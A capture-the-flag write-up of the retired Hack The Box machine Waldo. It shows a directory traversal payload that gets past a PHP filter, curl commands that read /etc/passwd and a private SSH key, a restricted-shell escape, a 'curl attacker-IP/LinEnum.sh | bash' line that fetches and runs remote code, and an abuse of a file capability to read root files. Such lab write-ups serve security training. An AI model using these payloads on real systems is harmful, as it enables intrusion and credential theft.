# Waldo

This is the write-up for the box Waldo that got retired at the 15th December 2018.
My IP address was 10.10.14.7 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.87    waldo.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/waldo.nmap 10.10.10.87
```

```markdown
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook
```

## Checking HTTP (Port 80)

On the web page there is some kind of _List Manager_ where it is possible to add and delete lists:

![Waldo list manager](https://kyuu-ji.github.io/htb-write-up/waldo/waldo_web-1.png)

When intercepting the functionalities of the web page with any proxy tool like **Burpsuite**, it becomes clear that something happens in the background.

| Action | Response | POST Data |
| ------ | -------- | --------- |
| Click on _Delete_ to delete a list | POST /fileDelete.php HTTP/1.1 | listnum=1 |
| Click on _Add List_ to add a list | POST /fileWrite.php HTTP/1.1 | listnum=1&data= |
| After forwarding any delete or add function | POST /dirRead.php HTTP/1.1 | path=./.list/ |
| Click on list name to read a list | POST /fileRead.php HTTP/1.1 | file=./.list/list1 |

So the lists come from the _/.list_ directory, which returns a HTTP status code _403 Forbidden_ when browsing there manually.
When trying to read _/etc/passwd_ with a **Directory Traversal attack** it does not work, but as the _fileRead.php_ file seems to read files on the server, we can try to read itself:
```markdown
POST /fileRead.php HTTP/1.1
(...)
file=./fileRead.php
```

It works and outputs the contents of the PHP script. It is in JSON format and not good to read, but can be fixed with **jq**:
```markdown
curl -s http://10.10.10.87/fileRead.php -d 'file=fileRead.php' | jq -r ."file"
```
```php
<?php

if($_SERVER['REQUEST_METHOD'] === "POST"){
        $fileContent['file'] = false;
        header('Content-Type: application/json');
        if(isset($_POST['file'])){
                header('Content-Type: application/json');
                $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                if(strpos($_POST['file'], "user.txt") === false){
                        $file = fopen("/var/www/html/" . $_POST['file'], "r");
                        $fileContent['file'] = fread($file,filesize($_POST['file']));  
                        fclose();
                }
        }
        echo json_encode($fileContent);
}\:
```

The _str_replace_ is the reason why the **Directory Traversal attack** did not work, but this can by bypassed.
It replaces _"../"_ with nothing, so using _"....//"_ instead, it will replace one _"../"_ and leave one _"../"_ behind, which results in a directory traversal:
```markdown
POST /fileRead.php HTTP/1.1
(...)
file=....//....//....//etc/passwd
```

This works and outputs the contents of _/etc/passwd_ and thus reading files on the box is possible.

As the _dirRead.php_ reads directories from the box, the same attack can be done on this script to enumerate the system more.
```markdown
POST /dirRead.php HTTP/1.1
(...)
path=.
```

This shows the contents of the current directory and there are all PHP scripts and some images which means we now have the capability to enumerate directories with _dirRead.php_ and reading files with _fileRead.php_.

### Enumerating the File System

Lets move up some directories until reaching the root (/) directory:
```markdown
POST /dirRead.php HTTP/1.1
(...)
path=....//....//....//
```

This can also be done with `curl` for easier exploitation:
```markdown
curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//' | jq
```

It shows a default Linux file system tree with the only thing that is different is the _.dockerenv_ directory, which means this is a **Docker container**.

There is one home directory of _nobody_ with a _.ssh_ directory:
```markdown
curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//home/nobody/.ssh' | jq
```
```markdown
".monitor"
"authorized_keys"
"known_hosts"
```

Displaying the contents of _.monitor_:
```markdown
curl -s http://10.10.10.87/fileRead.php -d 'file=....//....//....//home/nobody/.ssh/.monitor' | jq -r ."file"
```

It is a private SSH key, so lets try it out with the user _nobody_:
```markdown
ssh -i nobody.key nobody@10.10.10.87
```

It works and we are logged in as _nobody_.

## Privilege Escalation

This **Docker container** has two network interfaces:
- docker0 IP: 172.17.0.1
- enps33 IP: 10.10.10.87

When looking at the current connections with `netstat -alnp`, it shows that we are connected to port 8888:
```markdown
tcp        0    148 10.10.10.87:8888        10.10.14.7:33462        ESTABLISHED -
```

So when we connected to SSH on _10.10.10.87:22_, it routed us to _172.17.0.1:8888_.

Looking at listening network services:
```markdown
netstat -alnp | grep LISTEN
```
```markdown
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
```

There is a connectivity between the container and the host as the SSH header is different from the initial header:
```markdown
nc 10.10.10.87 22

SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
```

The _/home/nobody/.ssh/authorized_keys_ file shows that there is a user called _monitor_ that can access the host with the key from before:
```markdown
ssh -i .monitor monitor@127.0.0.1
```

This gives access into another box and greets us with a message that it is a **Restricted Bash**:
 ```markdown
-rbash: alias: command not found
```

### Escaping Restricted Shell

Lets look at the path what is possible to execute:
 ```markdown
echo $PATH

/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

Binaries in _/home/monitor/bin_:
- ls, most, red, nano

In _/home/monitor/app-dev/_ is a binary _logMonitor_ and the directory has the source code files for this binary.
 ```markdown
-rwxrwx--- 1 app-dev monitor   13704 Jul 24  2018 logMonitor
```

It is writeable by the user _app-dev_ and members of the group _monitor_.
Lets check if our user is in the group:
```markdown
rnano /etc/passwd

monitor:x:1001:1001:User
```
```markdown
rnano /etc/group

monitor:x:1001:
```

The user is in the group and thus it is possible to rewrite the file with _/bin/bash_:
```markdown
red /bin/bash

1099016
w app-dev/logMonitor
1099016
q
```

After executing _logMonitor_ it executes _bash_ and the restricted shell is escaped.
Lets modify the _PATH_ so system binaries can be used more comfortably:
```markdown
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Privilege Escalation to root

To get any attack surface, it is a good idea to run any **Linux Enumeration Script** on the box:
```markdown
curl 10.10.14.7/LinEnum.sh | bash
```

After analyzing, there is a file that has [Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) set:
```markdown
/usr/bin/tac = cap_dac_read_search+ei
```

As the manual page describes the _CAP_DAC_READ_SEARCH_ capability, the binary can do the following:
> "Bypass file read permission checks and directory read and execute permission checks"

So it is possible to read _root.txt_!
```markdown
/usr/bin/tac /root/root.txt
```
